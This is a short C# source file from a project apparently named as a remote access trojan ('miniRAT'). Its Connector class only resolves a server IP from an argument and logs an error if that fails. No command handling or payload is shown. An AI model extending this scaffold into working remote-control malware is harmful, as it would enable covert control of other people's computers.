using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;

namespace miniRAT
{
    /// <summary>
    /// Connect to server and send and recive commands
    /// </summary>
    class Connector
    {
        public static Boolean ConnectToServer(string []args)
        {
            IPAddress serverIP= DomainResolver.GetServerIP(args[0]);
            
            if (serverIP == null)
            {
                LogWriter.WriteLog("ConnectToServer: Error serverIP is null");
                return false;
            }
            

            return true;
        }
    }
}
